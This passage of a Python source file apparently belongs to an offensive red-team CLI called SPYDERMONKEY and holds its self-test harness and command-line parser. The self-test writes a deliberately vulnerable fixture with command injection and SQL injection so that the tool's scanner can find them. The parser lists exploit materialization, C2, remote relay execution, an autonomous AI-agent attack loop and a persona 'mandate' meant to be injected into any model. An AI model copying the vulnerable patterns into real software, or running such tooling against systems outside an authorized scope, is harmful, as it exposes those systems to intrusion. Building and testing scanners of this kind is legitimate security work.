              f" report: {report} ═══")
    return rc


def _mission_summary(name: str, payload: dict) -> str:
    try:
        if name == "triage":
            return (f"{len(payload.get('findings', []))} finding(s)"
                    f" · {len(payload.get('blocking', []))} blocking")
        if name == "chains":
            return f"{payload.get('count', len(payload.get('chains', [])))} chain(s)"
        if name == "coverage":
            return f"{payload.get('complete', 0)}/{payload.get('total', 13)} phases"
        if name == "report":
            return f"{payload.get('output', '?')} ({payload.get('bytes', 0)} bytes)"
    except Exception:
        pass
    return f"rc ok · {str(payload)[:120]}"


def _verify_gate_live():
    """verify's live proof: spin the demo replica, run ONE 3-gate confirmation
    against it, require CONFIRMED. The engine is exercised, not asserted."""
    srv = None
    try:
        srv, base = _demo_replica()
        time.sleep(0.2)
        b = _http(base + "/api/orders?org_id=acme")
        a = _http(base + "/api/orders?org_id=foreign")
        ok = b["status"] == 200 and a["status"] == 200 and b["body"] != a["body"] \
            and '"org": "foreign"' in a["body"]
        return ok, "live gate proof: baseline→attack→diff CONFIRMED on the lab replica"
    except Exception:
        return False, "live gate proof failed"
    finally:
        if srv is not None:
            try:
                srv.shutdown()
            except Exception:
                pass


def _run_selftest(quick: bool = False) -> dict:
    """Exercise the real CLI end-to-end in a throwaway HOME.

    Nothing touches the operator's estate: HOME, SPYDERMONKEY_HOME and
    SPYDERMONKEY_SCOPE all point inside one temporary directory. The gate proof
    strikes only the built-in 127.0.0.1 lab replica.
    """
    root = Path(__file__).resolve().parent.parent
    script = Path(__file__).resolve()
    tmp = Path(tempfile.mkdtemp(prefix="spydermonkey-selftest-"))
    env = os.environ.copy()
    env.update({
        "HOME": str(tmp),
        "SPYDERMONKEY_HOME": str(tmp / ".redteam"),
        "SPYDERMONKEY_SCOPE": str(tmp / "scope.json"),
        "SM_SELFTEST": "1",
    })
    checks = []

    def add(name, ok, detail=""):
        checks.append({"name": name, "ok": bool(ok), "detail": str(detail)[:400]})

    def run(args, timeout=45):
        try:
            r = subprocess.run([sys.executable, str(script)] + args,
                               capture_output=True, text=True, timeout=timeout,
                               env=env, cwd=str(root))
            return r.returncode, r.stdout, r.stderr
        except subprocess.TimeoutExpired:
            return 124, "", f"timed out after {timeout}s"
        except Exception as e:
            return 1, "", str(e)

    def json_run(name, args, predicate, expect_rc=0, timeout=45):
        rc, out, err = run(args + ["--json"], timeout=timeout)
        payload = None
        try:
            payload = json.loads(out)
        except Exception:
            pass
        if expect_rc == 0:
            ok = rc == 0 and payload is not None and predicate(payload)
        else:
            ok = rc == expect_rc
        detail = f"rc={rc}"
        if payload is None:
            detail += " · non-JSON output: " + ((out or err).strip()[:200])
        elif not ok:
            detail += " · " + json.dumps(payload)[:240]
        add(name, ok, detail)
        return payload

    srv = None
    try:
        json_run("version", ["version"],
                 lambda p: p.get("version") == VERSION and p.get("schema") == SCHEMA)
        json_run("tree", ["tree"],
                 lambda p: len(p.get("mandates", [])) == 10)
        json_run("route", ["route", "--goal", "protect my opsec"],
                 lambda p: p.get("primary") == "barbican")
        if not quick:
            json_run("bench", ["bench"],
                     lambda p: p.get("passed", 0) >= 27 and p.get("accuracy", 0) >= 90,
                     timeout=60)
            # v7.1 — the source lane: a REAL fixture, real dataflow, exercised
            fixture = tmp / "selftest-fixture" / "app.py"
            fixture.parent.mkdir(parents=True, exist_ok=True)
            fixture.write_text(
                "import os\nfrom flask import request\n"
                "def run_diag():\n"
                "    raw = request.form.get('cmd')\n"
                "    os.system('systemctl ' + raw)\n"
                "def look():\n"
                "    q = request.args.get('q')\n"
                "    sql = 'SELECT * FROM u WHERE n=' + q\n"
                "    cur.execute(sql)\n")
            json_run("discover", ["discover", "--target", "127.0.0.1",
                                  "--source", str(fixture.parent)],
                     lambda p: p.get("cards", 0) >= 2
                     and {"sqli", "cmdi"} <= set(p.get("by_cls", {})),
                     timeout=60)
            json_run("attack-map", ["attack"],
                     lambda p: p.get("mapped_files", 0) > 0
                     and p.get("technique_count", 0) >= 20,
                     timeout=60)

        scope_file = str(tmp / "scope.json")
        rc, out, err = run(["scope", "init", "--engagement", "selftest",
                            "--in-scope", "example.test,10.0.0.0/24",
                            "--out-of-scope", "deny.example.test",
                            "--file", scope_file, "--json"])
        try:
            sp = json.loads(out)
        except Exception:
            sp = {}
        add("scope init", rc == 0 and sp.get("engagement") == "selftest",
            f"rc={rc} {err.strip()[:160]}")
        json_run("scope allow", ["scope", "check", "--file", scope_file,
                                 "--value", "https://api.example.test/v1"],
                 lambda p: p.get("in_scope") is True)
        json_run("scope deny", ["scope", "check", "--file", scope_file,
                                "--value", "https://evil.test/"],
                 lambda p: p.get("in_scope") is False, expect_rc=1)

        proof = ("baseline: GET /api/orders?org_id=acme -> 200 acme; "
                 "attack: GET /api/orders?org_id=foreign -> 200 foreign; "
                 "diff: body echoes the swapped org id")
        json_run("ledger evidence gate",
                 ["ledger", "add", "--target", "selftest",
                  "--title", "cross-tenant order read", "--cls", "IDOR",
                  "--asset", "https://api.example.test/api/orders?org_id=acme",
                  "--proof", proof],
                 lambda p: p.get("finding", {}).get("status") == "CONFIRMED")
        json_run("ledger dedupe",
                 ["ledger", "add", "--target", "selftest",
                  "--title", "cross-tenant order read", "--cls", "IDOR",
                  "--asset", "https://api.example.test/api/orders?org_id=acme",
                  "--proof", "second evidence sample"],
                 lambda p: p.get("duplicate") is True)
        json_run("ledger integrity", ["ledger", "verify", "--target", "selftest"],
                 lambda p: p.get("ok") is True)

        srv, base = _demo_replica()
        time.sleep(0.2)
        json_run("gate live proof",
                 ["gate", "--target", "selftest", "--url",
                  base + "/api/orders?org_id=acme", "--attack-query", "org_id=foreign",
                  "--confirm", "foreign"],
                 lambda p: p.get("confirmed") is True, timeout=30)

        if not quick:
            json_run("testers demo",
                     ["testers", "--target", "selftest", "--demo"],
                     lambda p: len(p.get("testers", [])) == 18 and p.get("confirmed", 0) >= 1,
                     timeout=90)
            json_run("chain detect",
                     ["chain", "detect", "--target", "selftest"],
                     lambda p: len(p.get("chains", [])) >= 1)
            json_run("hypothesis gen",
                     ["hypothesis", "gen", "--target", "selftest", "--json"],
                     lambda p: p.get("total", 0) >= 1
                     and all(c.get("walls") for c in p.get("cards", [])),
                     timeout=60)
        json_run("phases board", ["phases", "--target", "selftest"],
                 lambda p: p.get("total") == 13 and len(p.get("phases", [])) == 13)
        if not quick:
            json_run("coverage", ["coverage", "--target", "selftest"],
                     lambda p: len(p.get("phases", [])) == 13)
            report_path = tmp / "report.md"
            rc, out, err = run(["report", "--target", "selftest",
                               "--format", "markdown", "--output", str(report_path)])
            body = report_path.read_text(errors="replace") if report_path.exists() else ""
            add("report", rc == 0 and "Executive summary" in body,
                f"rc={rc} path={report_path} bytes={len(body)}")
            json_run("campaign init",
                     ["campaign", "init", "--target", "selftest-camp",
                      "--objective", "selftest engagement"],
                     lambda p: p.get("campaign", {}).get("target") == "selftest-camp")
            json_run("campaign list",
                     ["campaign", "list"],
                     lambda p: any(c.get("target") == "selftest-camp"
                                   for c in p.get("campaigns", [])))
            json_run("campaign show", ["campaign", "show", "--target", "selftest-camp"],
                     lambda p: p.get("campaign", {}).get("target") == "selftest-camp")
            json_run("campaign timeline",
                     ["campaign", "timeline", "--target", "selftest-camp"],
                     lambda p: p.get("count", 0) >= 1)
            json_run("campaign archive",
                     ["campaign", "archive", "--target", "selftest-camp"],
                     lambda p: p.get("removed") is False and p.get("bytes", 0) > 0)
            json_run("campaign purge guard",
                     ["campaign", "purge", "--target", "selftest-camp"],
                     lambda p: False, expect_rc=2)
            json_run("campaign purge",
                     ["campaign", "purge", "--target", "selftest-camp", "--force"],
                     lambda p: p.get("purged") is True)
        json_run("mandates verify", ["mandates", "verify"],
                 lambda p: p.get("ok") is True and p.get("count") == 10)
        # Companion scripts are exercised directly (not dispatcher subcommands).
        mcp = root / "scripts" / "mcp_server.py"
        try:
            r = subprocess.run([sys.executable, str(mcp), "--test"],
                               capture_output=True, text=True, timeout=60,
                               env=env, cwd=str(root))
            mp = json.loads(r.stdout)
            add("mcp --test", r.returncode == 0 and mp.get("version") == VERSION
                and len(mp.get("tools", [])) >= 25,
                f"rc={r.returncode} tools={len(mp.get('tools', []))}")
        except Exception as e:
            add("mcp --test", False, str(e)[:200])
        try:
            arsenal = root / "scripts" / "arsenal.py"
            r = subprocess.run([sys.executable, str(arsenal), "verify"],
                               capture_output=True, text=True, timeout=60,
                               env=env, cwd=str(root))
            add("arsenal verify", r.returncode == 0,
                f"rc={r.returncode} {r.stdout.strip()[:200]}")
        except Exception as e:
            add("arsenal verify", False, str(e)[:200])
        if not quick:
            try:
                bl = root / "scripts" / "bench_live.py"
                r = subprocess.run([sys.executable, str(bl), "--json", "--no-engine"],
                                   capture_output=True, text=True, timeout=60,
                                   env=env, cwd=str(root))
                bp = json.loads(r.stdout)
                add("bench_live", r.returncode == 0 and bp.get("accuracy", 0) >= 90,
                    f"rc={r.returncode} accuracy={bp.get('accuracy')}")
            except Exception as e:
                add("bench_live", False, str(e)[:200])
    finally:
        if srv is not None:
            try:
                srv.shutdown()
            except Exception:
                pass
        shutil.rmtree(tmp, ignore_errors=True)

    passed = sum(1 for c in checks if c["ok"])
    return {"ok": passed == len(checks) and bool(checks),
            "passed": passed, "total": len(checks), "checks": checks,
            "quick": quick}


def cmd_selftest(args):
    result = _run_selftest(quick=bool(getattr(args, "quick", False)))
    if _json_mode(args):
        _emit(args, result)
    else:
        print(f"═══ SPYDERMONKEY SELFTEST — throwaway HOME {'(quick)' if result['quick'] else ''} ═══")
        for c in result["checks"]:
            print(f"  {'✓' if c['ok'] else '✗'} {c['name']:24s} {c['detail']}")
        print(f"═══ {result['passed']}/{result['total']} checks passed ═══")
    return 0 if result["ok"] else 1


def _extract_global_flags(argv: list[str]) -> tuple[list[str], bool, bool]:
    """Pull --json/--scope-file/--version out of any position.

    argparse only accepts global flags before the subcommand; operators type
    them after. One preprocessing pass makes `--json` universal without
    defining it on thirty subparsers.
    """
    out, json_flag, version = [], False, False
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--json":
            json_flag = True
            i += 1
            continue
        if a == "--version":
            version = True
            i += 1
            continue
        if a == "--scope-file":
            if i + 1 >= len(argv):
                raise UsageError("--scope-file needs a value")
            os.environ["SPYDERMONKEY_SCOPE"] = argv[i + 1]
            i += 2
            continue
        if a.startswith("--scope-file="):
            os.environ["SPYDERMONKEY_SCOPE"] = a.split("=", 1)[1]
            i += 1
            continue
        out.append(a)
        i += 1
    return out, json_flag, version


def _build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        description="SPYDERMONKEY — master dispatcher of the HolyShit family",
        epilog="Exit codes: 0 ok · 1 gate/verify/scope failure · 2 usage · 130 interrupted")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("tree", help="the family + roles + chain")
    sub.add_parser("version", help="version · data root · scope path · engine presence")

    r = sub.add_parser("route", help="goal → mandate sequence")
    r.add_argument("--goal", required=True)

    rn = sub.add_parser("run", help="the full pipeline (SHIKI assault)")
    rn.add_argument("--target", required=True)
    rn.add_argument("--url", required=True)
    rn.add_argument("--domain", required=True)
    rn.add_argument("--bundle")
    rn.add_argument("--boundary-url")
    rn.add_argument("--probe-ids")
    rn.add_argument("--parallel", action="store_true")
    rn.add_argument("--resume", action="store_true")
    rn.add_argument("--close", action="store_true")
    rn.add_argument("--dry-run", action="store_true",
                    help="print the delegated command; do not execute")

    ms = sub.add_parser("mission", help="one command: fleet + intelligence layer + report")
    ms.add_argument("--target", required=True)
    ms.add_argument("--url", required=True)
    ms.add_argument("--domain", required=True)
    ms.add_argument("--goal")
    ms.add_argument("--skip-fleet", action="store_true")
    ms.add_argument("--close", action="store_true")
    nx = sub.add_parser("next", help="KERNEL: the one next directive (state-driven planner)")
    nx.add_argument("--target", required=True)
    nx.add_argument("--url")
    nx.add_argument("--domain")
    nx.add_argument("--json", action="store_true", help="machine-readable directive")
    ab = sub.add_parser("absorb", help="KERNEL: validate a result through the gates, ingest, re-plan")
    ab.add_argument("--target", required=True)
    ab.add_argument("--file", required=True, help="result JSON (schema: next --json)")
    ab.add_argument("--url")
    ab.add_argument("--domain")
    lp = sub.add_parser("loop", help="KERNEL: the brrrr — plan→execute→absorb→repeat until complete")
    lp.add_argument("--target", required=True)
    lp.add_argument("--url")
    lp.add_argument("--domain")
    lp.add_argument("--agent-cmd", dest="agent_cmd",
                    help="external reasoning cell, e.g. 'claude -p' or 'hermes -z' "
                         "(default: AUTOPILOT — the engines run their own directives)")
    lp.add_argument("--max-steps", dest="max_steps", type=int, default=12)
    lp.add_argument("--agent-timeout", dest="agent_timeout", type=int, default=900)
    lp.add_argument("--trace-file", dest="trace_file",
                    help="append every loop step (directive→result→verdict) as JSONL — the training-data collector")
    lp.add_argument("--plan-only", dest="plan_only", action="store_true",
                    help="print the battle plan, execute nothing")
    ms.add_argument("--plan", action="store_true", help="show the mission plan; execute nothing")
    ms.add_argument("--dry-run", action="store_true", help="alias for --plan")
    ms.add_argument("--resume", action="store_true", help="skip completed mission steps")
    ms.add_argument("--timeout", type=int, default=300)

    ph = sub.add_parser("phases", help="the 13-phase methodology board")
    ph.add_argument("--target", required=True)
    ph.add_argument("--set-phase", dest="set_phase", help="phase id to override")
    ph.add_argument("--phase-status", dest="phase_status",
                    choices=("not_started", "in_progress", "completed", "blocked"))
    ph.add_argument("--clear-override", dest="clear_override",
                    help="clear a manual phase override")

    np = sub.add_parser("next-phase", help="the next 13-phase board action, with the exact command")
    np.add_argument("--target", required=True)

    lg = sub.add_parser("ledger", help="the finding ledger: add · list · show · triage · export")
    lg.add_argument("action", choices=("add", "list", "show", "triage", "verify",
                                       "stats", "export", "update", "sync"))
    lg.add_argument("--target", required=True)
    lg.add_argument("--title")
    lg.add_argument("--cls", default="GENERAL")
    lg.add_argument("--class", dest="cls_filter", help="filter list by class (comma-separated)")
    lg.add_argument("--asset", help="url/host the finding is about")
    lg.add_argument("--severity",
                    choices=("info", "low", "medium", "high", "critical"),
                    default=None,
                    help="severity (add/update/filter); default is inferred from impact")
    lg.add_argument("--proof", help="'baseline: … attack: … diff: …' (else downgraded to hypothesis)")
    lg.add_argument("--proof-file", dest="proof_file", help="read the proof from a file")
    lg.add_argument("--cwe")
    lg.add_argument("--wstg")
    lg.add_argument("--attack")
    lg.add_argument("--cvss", type=float)
    lg.add_argument("--id")
    lg.add_argument("--status", help="new status (update) or status filter (list)")
    lg.add_argument("--search", help="substring search across every field")
    lg.add_argument("--sort", choices=("id", "severity", "cvss", "confidence",
                                       "class", "updated"), default="id")
    lg.add_argument("--limit", type=int)
    lg.add_argument("--format", choices=("json", "jsonl", "csv", "markdown", "sarif"),
                    default="json", help="export format")
    lg.add_argument("--output", help="export path ('-' = stdout)")
    lg.add_argument("--note", help="update note / evidence annotation")
    lg.add_argument("--dry-run", action="store_true")
    lg.add_argument("--strict", action="store_true",
                    help="verify: also require every row to be signed")

    gt = sub.add_parser("gate", help="the 3-gate confirmation engine: baseline → attack → diff")
    gt.add_argument("--target", required=True)
    gt.add_argument("--url", help="baseline request url (required unless --prove)")
    gt.add_argument("--attack-query", dest="attack_query",
                    help="query params for the attack request (required unless --prove)")
    gt.add_argument("--baseline-query", dest="baseline_query",
                    help="override baseline query (default: the url's own)")
    gt.add_argument("--append-query", dest="append_query", action="store_true",
                    help="attack request keeps the baseline params and adds the attack params")
    gt.add_argument("--method", default="GET")
    gt.add_argument("--data", help="POST body")
    gt.add_argument("--attack-data", dest="attack_data", help="separate body for the attack request")
    gt.add_argument("--header", action="append", help="'Name: value' (repeatable)")
    gt.add_argument("--json-body", help="POST a JSON body as the BASELINE (gate v2: body differentials)")
    gt.add_argument("--attack-body", help="the JSON body for the ATTACK request (with --json-body)")
    gt.add_argument("--cookie", help="'k=v' — sent as Cookie on both requests")
    gt.add_argument("--confirm", help="token that must appear in the attack body for CONFIRMED")
    gt.add_argument("--expect-regex", dest="expect_regex",
                    help="regex that must match the attack body")
    gt.add_argument("--expect-status", dest="expect_status", type=int,
                    help="HTTP status the attack response must have")
    gt.add_argument("--auto-confirm", dest="auto_confirm", action="store_true",
                    help="CONFIRMED on a stable measurable diff without a token")
    gt.add_argument("--reps", type=int, default=1, help="baseline repetitions (instability check)")
    gt.add_argument("--timeout", type=int, default=8)
    gt.add_argument("--title", help="ledger title (default: derived)")
    gt.add_argument("--cls", default="DIFFERENTIAL")
    gt.add_argument("--severity", choices=("info", "low", "medium", "high", "critical"),
                    default=None)
    gt.add_argument("--cwe")
    gt.add_argument("--prove", metavar="SPY-NNN", help="replay the stored 3-gate evidence")
    gt.add_argument("--replay", action="store_true",
                    help="with --prove: re-fire the stored requests")

    ch = sub.add_parser("chain", help="10 chain patterns: low findings → high-impact chains")
    ch.add_argument("action", choices=("detect", "plan", "list"))
    ch.add_argument("--target", required=True)
    ch.add_argument("--id", dest="chain_id", help="CH-NNN for plan")
    ch.add_argument("--pattern", help="custom pattern (with --requires)")
    ch.add_argument("--requires", help="custom chain classes, e.g. 'IDOR+HARVEST'")
    ch.add_argument("--asset")
    ch.add_argument("--plan-text", dest="plan_text")
    ch.add_argument("--severity", choices=("info", "low", "medium", "high", "critical"))
    ch.add_argument("--min-confidence", dest="min_confidence", type=float, default=0.0)
    ch.add_argument("--include-hypothesis", dest="include_hypothesis", action="store_true")

    # ── v5.6.0: the reasoning engine ─────────────────────────────────────────
    hp = sub.add_parser("hypothesis", help="THE REASONING ENGINE: datasets → ranked, wall-checked hypothesis cards that guide a model to unconfirmed vuln instances")
    hp.add_argument("action", choices=("gen", "brief", "run"))
    hp.add_argument("--target", required=True)
    hp.add_argument("--url", help="one surface url to reason from (else the mined context)")
    hp.add_argument("--kinds", help="comma list: surface,cve-map,variant,chain (default: all)")
    hp.add_argument("--id", dest="id", help="run: the card id (default: top executable card)")
    hp.add_argument("--timeout", type=int, default=8)

    cx = sub.add_parser("context", help="session context: endpoints · roles · credentials · functions")
    cx.add_argument("action", choices=("set", "show", "remove", "clear"))
    cx.add_argument("--target", required=True)
    cx.add_argument("--kind", help="endpoint | role | credential | function")
    cx.add_argument("--value", action="append",
                    help="value(s) for set/remove (repeatable)")
    cw = sub.add_parser("crawl", help="THE SURFACE ENGINE: mine endpoints/params from links, forms and JS")
    cw.add_argument("--target", required=True)
    cw.add_argument("--url", required=True)
    cw.add_argument("--depth", type=int, default=2)
    cw.add_argument("--timeout", type=int, default=8)
    tk = sub.add_parser("takeover", help="THE TAKEOVER ENGINE: dangling CNAME fingerprints (read-only, NO-GAIN)")
    tk.add_argument("--target", required=True)
    tk.add_argument("--domain", required=True)
    tk.add_argument("--json", action="store_true")
    tk.add_argument("--subdomains", help="file of subdomains (else the finder state + the domain)")
    cp = sub.add_parser("capabilities", help="THE MIRROR OF SELF: live-introspected capability registry")
    cp.add_argument("--json", action="store_true")
    pt = sub.add_parser("protect", help="SELF-PROTECTION: operator posture · artifact leak scan · wipe proof")
    pt.add_argument("--json", action="store_true")
    pt.add_argument("action", choices=("posture", "scan"))
    pt.add_argument("--target", help="one campaign (or --all-campaigns)")
    pt.add_argument("--all-campaigns", dest="all_campaigns", action="store_true")
    tr = sub.add_parser("train", help="SELF-PLAY: attack the dojo range, learn per-class hit rates (priors)")
    tr.add_argument("--target", default="training")
    tr.add_argument("--classes", help="comma list (default: every dojo class)")
    tr.add_argument("--port", type=int, default=8850)
    tr.add_argument("--json", action="store_true")
    dv7 = sub.add_parser("discover", help="THE SOURCE LANE (v7.0): read-only scan of the target's own source → ranked, gate-ready candidate cards (documented classes only)")
    dv7.add_argument("--target", required=True)
    dv7.add_argument("--source", required=True, help="local source tree (read-only)")
    dv7.add_argument("--lang", help="python|php|js|java|go|c|ruby|csharp")
    dv7.add_argument("--limit", type=int, default=200)
    dv7.add_argument("--semgrep", action="store_true",
                     help="fold semgrep results when the binary exists (fleet machines)")
    dv7.add_argument("--json", action="store_true")
    am = sub.add_parser("attack", help="THE ATT&CK MAP (v7.0): the corpus indexed against MITRE ATT&CK — vs Atomic Red Team, live")
    am.add_argument("--json", action="store_true")
    mm = sub.add_parser("memory", help="ESTATE MEMORY: what the family knows about a target")
    mm.add_argument("--target", required=True)
    mm.add_argument("--forget", action="store_true")
    mm.add_argument("--json", action="store_true")
    rm = sub.add_parser("remediate", help="THE FIX LOOP: recipe + machine-checked re-proof (lab walls)")
    rm.add_argument("--target", required=True)
    rm.add_argument("--id", dest="id", required=True)
    rm.add_argument("--reproof", action="store_true")
    rm.add_argument("--json", action="store_true")
    wt = sub.add_parser("watch", help="THE UNATTENDED RUNNER: loop → report → memory, on a clock")
    wt.add_argument("--target", required=True)
    wt.add_argument("--url", required=True)
    wt.add_argument("--domain", required=True)
    wt.add_argument("--every-mins", dest="every_mins", type=int, default=30)
    wt.add_argument("--max-cycles", dest="max_cycles", type=int, default=0, help="0 = until Ctrl-C")
    wt.add_argument("--max-steps", dest="max_steps", type=int, default=12)
    wt.add_argument("--cycle-timeout", dest="cycle_timeout", type=int, default=10)
    wt.add_argument("--trace-file", dest="trace_file",
                    help="append every loop step (directive→result→verdict) as JSONL — the training-data collector")
    wt.add_argument("--notify-cmd", dest="notify_cmd", help='external notifier, e.g. "notify-send"')

    # ── serve: the localhost war board ────────────────────────────────────────
    sv = sub.add_parser("serve", help="THE WAR BOARD: localhost dashboard (ledger · chains · phases · kernel)")
    wt.add_argument("--json", action="store_true")
    sv.add_argument("--port", type=int, default=9644)

    ts = sub.add_parser("testers", help="18 parallel sub-testers over the session context")
    ts.add_argument("--target", required=True)
    ts.add_argument("--url", action="append",
                    help="baseline target url (repeatable: one entry per surface)")
    ts.add_argument("--demo", action="store_true",
                    help="strike the built-in lab replica (no setup)")
    ts.add_argument("--timeout", type=int, default=8)

    cv = sub.add_parser("coverage", help="phase × deliverable matrix + gaps")
    cv.add_argument("--target", required=True)

    rp = sub.add_parser("report", help="the joint war report (markdown · json · sarif)")
    rp.add_argument("--target", required=True)
    rp.add_argument("--output", help="output path ('-' = stdout)")
    rp.add_argument("--format", choices=("markdown", "md", "json", "sarif"),
                    default="markdown")

    rl = sub.add_parser("relay", help="remote execution nodes: init · list · exec · remove")
    rl.add_argument("action", choices=("init", "list", "exec", "remove"))
    rl.add_argument("--name")
    rl.add_argument("--host", help="user@host for init")
    rl.add_argument("--cmd", dest="relay_cmd", help="command for exec (scope-checked)")
    rl.add_argument("--timeout", type=int, default=120)
    rl.add_argument("--dry-run", action="store_true")

    st = sub.add_parser("status", help="family meta-status")
    st.add_argument("--target")
    st.add_argument("--fast", action="store_true", help="presence only; do not run engine verify")

    vf = sub.add_parser("verify", help="meta self-check + live gate proof + selftest")
    vf.add_argument("--fast", action="store_true", help="presence-only engine checks")
    vf.add_argument("--no-selftest", dest="no_selftest", action="store_true")

    sl = sub.add_parser("selftest", help="end-to-end self-test in a throwaway HOME")
    sl.add_argument("--quick", action="store_true", help="skip the slower integration checks")

    cm = sub.add_parser("campaign", help="engagement lifecycle: init · list · show · timeline · archive · purge")
    cm.add_argument("action", choices=("init", "list", "show", "timeline",
                                       "archive", "purge", "close"))
    cm.add_argument("--target")
    cm.add_argument("--url")
    cm.add_argument("--domain")
    cm.add_argument("--objective")
    cm.add_argument("--engagement")
    cm.add_argument("--force", action="store_true")
    cm.add_argument("--remove", action="store_true",
                    help="archive: remove the source campaign (needs --force)")
    cm.add_argument("--note")
    cm.add_argument("--limit", type=int, default=100)

    md = sub.add_parser("mandates", help="the ten mandate contracts: list · show · verify")
    md.add_argument("action", choices=("list", "show", "verify"))
    md.add_argument("--name")

    ij = sub.add_parser("inject", help="THE CONTEXT PACKET (v7.4 retrieval layer): route verdict + kernel directive + session state + top canon/skill/tool knowledge for a goal — one block a model consumes as-is")
    ij.add_argument("--target", required=True)
    ij.add_argument("--goal", default="", help="goal words to route + retrieve on")
    ij.add_argument("--top", type=int, default=8, help="max knowledge hits")
    ij.add_argument("--budget", type=int, default=6000, help="max knowledge snippet chars")
    ij.add_argument("--kinds", default=None,
                    help="comma list of canon,skill,expanded,tool (default all)")

    fd = sub.add_parser("foundation", help="print THE FOUNDATION spec (v7.5): the seven-layer agent red-teaming protocol — the new shape")
    fd.add_argument("--file", action="store_true", help="print path only")

    mf = sub.add_parser("mandate", help="print the injectable mandate (persona contract)")
    mf.add_argument("--file", action="store_true", help="print path only")
    mf.add_argument("--session", action="store_true",
                    help="print the session-hijack mandate (the /spydermonkey injection contract) instead")
    mf.add_argument("--pack", action="store_true",
                    help="print the one-paste operator pack (persona + rails: walls · route table · loop · "
                         "evidence contract · engine menu — ~2k tokens, injectable into ANY model) instead")

    sc = sub.add_parser("scope", help="the scope authority: init · check · show · add · remove · history · extend")
    sc.add_argument("action", choices=("init", "check", "show", "add", "remove",
                                       "history", "extend"))
    sc.add_argument("--engagement")
    sc.add_argument("--in-scope", dest="in_scope", help="comma domains/CIDRs/urls")
    sc.add_argument("--out-of-scope", dest="out_of_scope", help="comma domains/CIDRs")
    sc.add_argument("--max-rate", dest="max_rate", type=int, help="max requests/sec (rules)")
    sc.add_argument("--value", help="domain/url/host to check (or add/remove)")
    sc.add_argument("--file", help="scope file (default $SPYDERMONKEY_SCOPE or ~/.redteam/scope.json)")
    sc.add_argument("--strict", action="store_true", help="no scope authority → rc=1")
    sc.add_argument("--expires", help="ISO-8601 expiry")
    sc.add_argument("--expires-days", dest="expires_days", type=int,
                    help="expiry N days from now")
    sc.add_argument("--force", action="store_true", help="replace an existing authority")
    sc.add_argument("--kind", help="add/remove: 'in' (allow) or 'out' (deny)")
    sc.add_argument("--limit", type=int, default=40)

    doc = sub.add_parser("doctor", help="full health check: engines · scope · states · canon · ledger")
    doc.add_argument("--fast", action="store_true")
    doc.add_argument("--fix", action="store_true",
                    help="tighten scope perms; rename corrupt JSON; remove stale temp files")

    sub.add_parser("bench", help="offline route-level benchmark (route accuracy)")

    ar = sub.add_parser("arsenal", help="scope-gated execution layer + acquisition lane")
    ar.add_argument("action", choices=("list", "plan", "run", "install", "verify"), nargs="?",
                    default="list")
    ar.add_argument("--target")
    ar.add_argument("--only")
    ar.add_argument("--chain", help="feeding chain (run) or chain to pull (install)")
    ar.add_argument("--tool", help="arsenal install: comma-separated tools")
    ar.add_argument("--machine", help="arsenal install: 'local' or a relay node name")
    ar.add_argument("--dry-run", action="store_true")
    ar.add_argument("--wordlist")
    ar.add_argument("--timeout", type=int, default=300)
    ar.add_argument("--output-dir")

    cg = sub.add_parser("catalog", help="KNOWN TOOL CATALOG: 1,053+ offensive tools + v7.3 MATERIALIZATION (real artifacts, not metadata)")
    cg.add_argument("action", choices=("stats", "categories", "list", "search", "show",
                                       "runbook", "materialize"),
                    nargs="?", default="stats")
    cg.add_argument("term", nargs="?", help="search term / tool name for show")
    cg.add_argument("--cat", help="filter by category prefix (e.g. web, recon/dns, wifi, ad)")
    cg.add_argument("--limit", type=int, default=50)
    cg.add_argument("--kind", choices=("exploit-db", "nuclei", "metasploit"),
                    help="runbook/materialize corpus")
    cg.add_argument("--id", help="runbook/materialize entry (edb-16929, CVE-2012-4242, xslt_password_reset, or path)")
    cg.add_argument("--out", help="materialize: target dir (default: cwd)")
    cg.add_argument("--dry-run", action="store_true",
                    help="materialize: print every command, touch nothing")

    fl = sub.add_parser("fleet", help="PARALLEL multi-agent dispatch: one agent per mandate")
    fl.add_argument("--goal", required=True)
    fl.add_argument("--target", required=True)
    fl.add_argument("--domain", required=True)
    fl.add_argument("--agents", help="comma subset (default: full relay)")
    fl.add_argument("--sequential", action="store_true")
    fl.add_argument("--dry-run", action="store_true")
    fl.add_argument("--timeout", type=int, default=45)
    fl.add_argument("--retries", type=int, default=0)

    # v6.0 — the 32 domain commands (5 subactions each): 40 → 200 subcommands
    for _d in DOMAINS:
        dp = sub.add_parser(_d, help=f"DOMAIN {_d}: list|show|tools|chains|plan (registry views + dry-run plans)")
        da = dp.add_subparsers(dest="domain_action", required=True)
        p2 = da.add_parser("list", help="catalog of domains")
        p2.add_argument("--cat", help="optional class filter")
        p3 = da.add_parser("show", help="domain summary: classes × tools × chains")
        p4 = da.add_parser("tools", help="registered tools of this domain")
        p4.add_argument("--query", help="substring filter")
        p4.add_argument("--installed", action="store_true", help="only installed tools")
        p5 = da.add_parser("chains", help="feeding chains touching this domain")
        p6 = da.add_parser("plan", help="dry-run per-tool argv for this domain (scope-checked)")
        p6.add_argument("--target", required=True)
        p6.add_argument("--wordlist")
    return ap


# ── v6.0: the 32 domain commands — registry views over the live arsenal ─────
DOMAINS = ["recon", "dns", "web", "api", "cms", "osint", "net", "services",
           "tls", "crypto", "packet", "fuzz", "exploit", "payload", "c2",
           "privesc", "win", "ad", "mail", "db", "cloud", "container",
           "scada", "iot", "hw", "mobile", "stego", "forensics", "malware",
           "social", "vuln", "brute"]

_DOMAIN_CLASSES = {
    "recon": ["recon", "dns", "osint", "domtake"], "dns": ["dns", "domtake"],
    "web": ["web", "harvest", "edge"], "api": ["api", "graphql", "socket"],
    "cms": ["cms"], "osint": ["osint", "breach", "opsec"],
    "net": ["net", "packet"], "services": ["services", "brute"],
    "tls": ["tls", "crypto"], "crypto": ["crypto"],
    "packet": ["packet"], "fuzz": ["fuzz"],
    "exploit": ["exploit", "msf"], "payload": ["payload"],
    "c2": ["c2"], "privesc": ["privesc", "linux"],
    "win": ["win"], "ad": ["ad", "win"], "mail": ["mail"],
    "db": ["db"], "cloud": ["cloud"],
    "container": ["container", "ci-cd", "iac"],
    "scada": ["scada"], "iot": ["iot", "esp"],
    "hw": ["hardware", "wifi", "ble", "rfid", "sdr", "esp", "audio"],
    "mobile": ["mobile"], "stego": ["stego"],
    "forensics": ["forensics"], "malware": ["malware"],
    "social": ["social", "phish"], "vuln": ["vuln", "nse"],
    "brute": ["brute"],
}


